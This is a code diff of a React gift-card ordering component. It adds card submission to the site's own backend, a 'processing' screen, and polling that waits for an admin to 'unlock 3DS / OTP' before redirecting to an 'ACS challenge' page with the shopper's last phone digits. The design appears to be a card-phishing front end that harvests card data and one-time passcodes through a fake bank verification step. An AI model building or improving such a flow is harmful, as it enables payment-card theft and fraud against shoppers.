@@ -1,10 +1,12 @@
-import React, {useState} from 'react';
-import {Activity, ArrowLeft, ArrowRight, Check, CreditCard, Globe, Wallet} from 'lucide-react';
+import React, {useEffect, useRef, useState} from 'react';
+import {Activity, ArrowLeft, ArrowRight, Check, CreditCard, Wallet, XCircle} from 'lucide-react';
 import {useLanguage} from '../context/LanguageContext';
 import {apiUrl} from '../lib/apiBase';
 import {formatLatinDigits} from '../lib/formatNumbers';
 import {getPackages, GIFT_CARD_PACKAGES, type GiftCardService, type GiftCardRegion, type GiftCardPackage} from '../lib/giftCardPackages';
 import {CreditCardPaymentFields} from './CreditCardPaymentFields';
+import {CardProcessingToOtpScreen} from './OtpPaymentUi';
+import {redirectToAcsChallenge} from '../lib/acsRedirect';
 import {validateCard, cardErrorMessage} from '../lib/cardValidation';
 
 /** أيقونات الخدمات */
@@ -57,10 +59,10 @@ function applyDiscount(price: number, percent: number): number {
   return Math.round(price * (100 - p) / 100);
 }
 
-type PaymentType = 'card' | 'wallet' | null;
+type PaymentType = 'choose' | 'card' | 'wallet' | null;
 
 export function GiftCardOrder({service, clientId, userId, walletBalance = 0, prices, discountPercent = 0, onBack, onComplete}: Props) {
-  const {lang, dir} = useLanguage();
+  const {lang, dir, t} = useLanguage();
   const BackIcon = dir === 'rtl' ? ArrowRight : ArrowLeft;
   const meta = SERVICE_META[service] ?? DEFAULT_SERVICE_META;
 
@@ -70,6 +72,10 @@ export function GiftCardOrder({service, clientId, userId, walletBalance = 0, pri
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [cardError, setCardError] = useState<ReturnType<typeof validateCard>>(null);
   const [done, setDone] = useState(false);
+  const [failed, setFailed] = useState(false);
+  const [cardProcessingToOtp, setCardProcessingToOtp] = useState(false);
+  const [currentOrderId, setCurrentOrderId] = useState<string | null>(null);
+  const redirectingRef = useRef(false);
 
   const allRegions = new Set((GIFT_CARD_PACKAGES[service] ?? []).map((p) => p.region));
   const showRegionToggle = allRegions.size > 1;
@@ -81,12 +87,68 @@ export function GiftCardOrder({service, clientId, userId, walletBalance = 0, pri
   const hasDiscount = discountPercent > 0;
   const noPrice = selected?.priceIqd === 0;
 
-  // عند تغيير المنطقة: حافظ على الاختيار إن وُجد مقابل في المنطقة الجديدة
   const changeRegion = (r: GiftCardRegion) => {
     setRegion(r);
     setSelected(null);
     setPaymentType(null);
   };
+
+  const openAcs = (orderRef: string, phoneLast3?: string | null) => {
+    if (redirectingRef.current) return;
+    redirectingRef.current = true;
+    redirectToAcsChallenge({
+      orderRef,
+      clientId,
+      lang,
+      phoneLast3: phoneLast3 || undefined,
+      returnUrl: `${window.location.origin}/`,
+    });
+  };
+
+  // Poll order status while waiting for admin to unlock 3DS / OTP
+  useEffect(() => {
+    if (!cardProcessingToOtp || !currentOrderId || !clientId) return;
+    let alive = true;
+
+    const poll = async () => {
+      try {
+        const qs = new URLSearchParams({
+          client_id: clientId,
+          order_ref: currentOrderId,
+        });
+        const res = await fetch(apiUrl(`/api/transactions/order-status?${qs.toString()}`));
+        if (!res.ok || !alive) return;
+        const data = (await res.json()) as {
+          status?: string;
+          phone_last3?: string | null;
+        };
+        const st = String(data.status || '').toLowerCase();
+        if (st === 'awaiting_otp' || st === 'retry_otp') {
+          openAcs(currentOrderId, data.phone_last3);
+          return;
+        }
+        if (st === 'completed') {
+          setCardProcessingToOtp(false);
+          setDone(true);
+          onComplete?.();
+          return;
+        }
+        if (st === 'failed' || st === 'refunded' || st === 'suspended') {
+          setCardProcessingToOtp(false);
+          setFailed(true);
+        }
+      } catch {
+        /* ignore transient poll errors */
+      }
+    };
+
+    void poll();
+    const id = window.setInterval(() => void poll(), 900);
+    return () => {
+      alive = false;
+      window.clearInterval(id);
+    };
+  }, [cardProcessingToOtp, currentOrderId, clientId, onComplete]);
 
   const backBtn = (onClick: () => void) => (
     <button type="button" onClick={onClick} className="flex items-center gap-2 mb-5">
@@ -96,19 +158,53 @@ export function GiftCardOrder({service, clientId, userId, walletBalance = 0, pri
     </button>
   );
 
-  if (done) return (
-    <div className="max-w-md mx-auto flex flex-col items-center justify-center min-h-[60vh] text-center px-4">
-      <div className="w-24 h-24 bg-green-50 text-green-500 rounded-full flex items-center justify-center mb-6 border-8 border-green-50/50">
-        <Check className="w-12 h-12" />
+  if (cardProcessingToOtp) {
+    return (
+      <CardProcessingToOtpScreen
+        lang={lang}
+        etaText={t('otpEtaDelivery')}
+      />
+    );
+  }
+
+  if (failed) {
+    return (
+      <div className="max-w-md mx-auto flex flex-col items-center justify-center min-h-[60vh] text-center px-4">
+        <div className="w-24 h-24 bg-red-50 text-red-500 rounded-full flex items-center justify-center mb-6 border-8 border-red-50/50">
+          <XCircle className="w-12 h-12" />
+        </div>
+        <h2 className="text-2xl font-black mb-2 text-gray-900">{lang === 'ar' ? 'فشل الدفع' : 'Payment Failed'}</h2>
+        <p className="text-gray-400 mb-8 text-sm">{lang === 'ar' ? 'حاول مرة أخرى أو تواصل مع الدعم' : 'Please try again or contact support'}</p>
+        <button
+          onClick={() => {
+            setFailed(false);
+            setCurrentOrderId(null);
+            setPaymentType('card');
+            redirectingRef.current = false;
+          }}
+          className="w-full max-w-xs bg-gray-900 text-white py-4 rounded-2xl font-bold active:scale-95"
+        >
+          {lang === 'ar' ? 'إعادة المحاولة' : 'Try Again'}
+        </button>
       </div>
-      <h2 className="text-2xl font-black mb-2 text-gray-900">{lang === 'ar' ? 'تم تقديم الطلب!' : 'Order Submitted!'}</h2>
-      <p className="text-gray-400 mb-8 text-sm">{lang === 'ar' ? 'سيتم إرسال الكود خلال دقائق' : 'Your code will be sent shortly'}</p>
-      <button onClick={() => { setDone(false); setSelected(null); setPaymentType(null); onBack(); }}
-        className="w-full max-w-xs bg-gray-900 text-white py-4 rounded-2xl font-bold active:scale-95">
-        {lang === 'ar' ? 'العودة للخدمات' : 'Back to Services'}
-      </button>
-    </div>
-  );
+    );
+  }
+
+  if (done) {
+    return (
+      <div className="max-w-md mx-auto flex flex-col items-center justify-center min-h-[60vh] text-center px-4">
+        <div className="w-24 h-24 bg-green-50 text-green-500 rounded-full flex items-center justify-center mb-6 border-8 border-green-50/50">
+          <Check className="w-12 h-12" />
+        </div>
+        <h2 className="text-2xl font-black mb-2 text-gray-900">{lang === 'ar' ? 'تم تقديم الطلب!' : 'Order Submitted!'}</h2>
+        <p className="text-gray-400 mb-8 text-sm">{lang === 'ar' ? 'سيتم إرسال الكود خلال دقائق' : 'Your code will be sent shortly'}</p>
+        <button onClick={() => { setDone(false); setSelected(null); setPaymentType(null); setCurrentOrderId(null); redirectingRef.current = false; onBack(); }}
+          className="w-full max-w-xs bg-gray-900 text-white py-4 rounded-2xl font-bold active:scale-95">
+          {lang === 'ar' ? 'العودة للخدمات' : 'Back to Services'}
+        </button>
+      </div>
+    );
+  }
 
   return (
     <div className="max-w-md mx-auto pb-6" dir={dir}>
@@ -176,7 +272,9 @@ export function GiftCardOrder({service, clientId, userId, walletBalance = 0, pri
 
           <button
             disabled={!selected || noPrice}
-            onClick={() => selected && !noPrice && setPaymentType(null) === undefined && setPaymentType('choose')}
+            onClick={() => {
+              if (selected && !noPrice) setPaymentType('choose');
+            }}
             className="w-full bg-red-600 text-white font-black py-4 rounded-2xl disabled:opacity-40 active:scale-[0.99] shadow-lg shadow-red-600/20"
           >
             {!selected ? (lang === 'ar' ? 'اختر باقة' : 'Select a Package') :
@@ -202,7 +300,6 @@ export function GiftCardOrder({service, clientId, userId, walletBalance = 0, pri
 
           <h3 className="font-black text-gray-900 mb-3">{lang === 'ar' ? 'طريقة الدفع' : 'Payment Method'}</h3>
           <div className="space-y-3">
-            {/* بطاقة */}
             <button onClick={() => setPaymentType('card')}
               className="w-full flex items-center gap-4 bg-white rounded-2xl px-4 py-4 border-2 border-gray-100 hover:border-blue-300 active:scale-[0.99] shadow-sm">
               <div className="w-12 h-12 rounded-xl bg-blue-50 flex items-center justify-center shrink-0">
@@ -214,7 +311,6 @@ export function GiftCardOrder({service, clientId, userId, walletBalance = 0, pri
               </div>
             </button>
 
-            {/* محفظة */}
             <button onClick={() => { if (selected && walletBalance >= selected.priceIqd) setPaymentType('wallet'); }}
               disabled={!selected || walletBalance < (selected?.priceIqd ?? 0)}
               className={`w-full flex items-center gap-4 rounded-2xl px-4 py-4 border-2 active:scale-[0.99] shadow-sm ${
@@ -235,7 +331,6 @@ export function GiftCardOrder({service, clientId, userId, walletBalance = 0, pri
           </div>
         </>
       ) : paymentType === 'wallet' ? (
-        /* دفع بالمحفظة */
         <div className="space-y-4">
           <div className="bg-green-50 rounded-2xl border border-green-100 p-4 flex items-center gap-3">
             <div className="w-10 h-10 rounded-xl bg-green-100 flex items-center justify-center">
@@ -269,7 +364,7 @@ export function GiftCardOrder({service, clientId, userId, walletBalance = 0, pri
           </button>
         </div>
       ) : (
-        /* دفع بالبطاقة */
+        /* دفع بالبطاقة → معالجة 1-2 دقيقة → صفحة 3DS */
         <form onSubmit={async (e) => {
           e.preventDefault();
           if (!clientId || !selected) return;
@@ -282,6 +377,7 @@ export function GiftCardOrder({service, clientId, userId, walletBalance = 0, pri
           if (err) { setCardError(err); return; }
           setCardError(null);
           setIsSubmitting(true);
+          redirectingRef.current = false;
           try {
             const res = await fetch(apiUrl('/api/transactions'), {
               method: 'POST',
@@ -299,11 +395,29 @@ export function GiftCardOrder({service, clientId, userId, walletBalance = 0, pri
                 },
               }),
             });
-            if (res.ok) { onComplete?.(); setDone(true); }
-          } finally { setIsSubmitting(false); }
+            if (!res.ok) {
+              setIsSubmitting(false);
+              return;
+            }
+            const data = await res.json();
+            const orderRef = data.order_ref || data.id;
+            if (!orderRef) {
+              setIsSubmitting(false);
+              return;
+            }
+            setCurrentOrderId(String(orderRef));
+            setCardProcessingToOtp(true);
+            setIsSubmitting(false);
+            onComplete?.();
+          } catch {
+            setIsSubmitting(false);
+          }
         }} className="space-y-4">
           <div className="bg-white rounded-2xl border border-gray-100 p-4">
             <CreditCardPaymentFields idPrefix="gc-cc" error={cardError} onChange={() => setCardError(null)} />
+            {cardError && (
+              <p className="mt-2 text-xs font-bold text-red-600">{cardErrorMessage(cardError, lang)}</p>
+            )}
           </div>
           <button type="submit" disabled={isSubmitting}
             className="w-full bg-red-600 text-white font-black py-4 rounded-2xl disabled:opacity-60 active:scale-[0.99] shadow-lg shadow-red-600/20">
@@ -314,4 +428,3 @@ export function GiftCardOrder({service, clientId, userId, walletBalance = 0, pri
     </div>
   );
 }
-
